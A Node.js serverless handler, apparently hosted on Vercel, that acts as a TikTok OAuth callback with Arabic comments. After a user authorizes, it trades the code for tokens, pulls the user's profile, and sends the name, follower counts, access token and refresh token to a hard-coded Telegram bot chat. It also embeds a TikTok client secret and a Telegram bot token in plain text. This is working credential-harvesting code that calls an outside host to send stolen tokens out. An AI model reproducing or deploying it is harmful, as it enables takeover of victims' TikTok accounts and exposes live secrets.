const https = require('https');

const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
const TELEGRAM_TOKEN = '8540803234:AAGD95o6JuOzVLYZ6-8Cm0vQDlPD3wtJGl4';
const TELEGRAM_CHAT_ID = '7644255708';

function makeRequest(options, postData = null) {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch(e) { resolve(data); }
      });
    });
    req.on('error', (err) => reject(err));
    if (postData) req.write(postData);
    req.end();
  });
}

// دالة إرسال نصوص عادية مبسطة ومجزأة تماماً لتجنب قيود الحظر للرموز الطويلة
function sendTelegramRaw(message) {
  const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
  const req = https.get(`https://api.telegram.org${path}`, (res) => {
    let d = '';
    res.on('data', (chunk) => d += chunk);
    res.on('end', () => console.log('Telegram raw status:', d));
  });
  req.on('error', (e) => console.error('Telegram error:', e));
}

module.exports = async (req, res) => {
  const urlParams = new URLSearchParams(req.url.split('?')[1]);
  const code = urlParams.get('code');
  const error = urlParams.get('error');

  if (error) {
    sendTelegramRaw(`🔴 TikTok Error: ${error}`);
    return res.end(`TikTok Error: ${error}`);
  }

  if (!code) {
    return res.end('AWR Engine: Active & Waiting for Authorization.');
  }

  try {
    const tokenPostData = `client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth.vercel.app/api/auth`;
    
    const tokenOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/oauth/token/',
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    };

    const tokenResponse = await makeRequest(tokenOptions, tokenPostData);
    const accessToken = tokenResponse.access_token;

    if (!accessToken) {
      sendTelegramRaw("⚠️ Failed to get access token from TikTok");
      return res.end('Failed to retrieve Access Token.');
    }

    const userOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/user/info/?fields=open_id,union_id,avatar_url,display_name,username,follower_count,following_count,likes_count,video_count',
      method: 'GET',
      headers: { 'Authorization': `Bearer ${accessToken}` }
    };

    const userResponse = await makeRequest(userOptions);
    const user = userResponse.data?.user;

    // 1. إرسال بيانات المستخدم الأساسية أولاً بنص بسيط جداً
    let userMsg = `🎯 SUCCESS TIKTOK DATA 🎯\n\n`;
    if (user) {
      userMsg += `Name: ${user.display_name || 'N/A'}\n`;
      userMsg += `Username: @${user.username || 'N/A'}\n`;
      userMsg += `ID: ${user.open_id}\n`;
      userMsg += `Followers: ${user.follower_count || 0}\n`;
      userMsg += `Likes: ${user.likes_count || 0}\n`;
    } else {
      userMsg += `⚠️ Token received, but profile parsing skipped.\n`;
    }
    sendTelegramRaw(userMsg);

    // 2. إرسال التوكينات بشكل مستقل لضمان عدم تأثر الرسالة الأولى بالرموز الخاصة
    setTimeout(() => {
      sendTelegramRaw(`🔑 TOKENS P1:\n\n${accessToken}`);
    }, 1000);

    if (tokenResponse.refresh_token) {
      setTimeout(() => {
        sendTelegramRaw(`🔄 REFRESH TOKEN:\n\n${tokenResponse.refresh_token}`);
      }, 2000);
    }

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<h1>🚀 تم التحديث النهائي والكامل! تفقد البوت الآن.</h1>');

  } catch (err) {
    sendTelegramRaw(`❌ Internal error occurred: ${err.message}`);
    res.end(`Internal Error: ${err.message}`);
  }
};
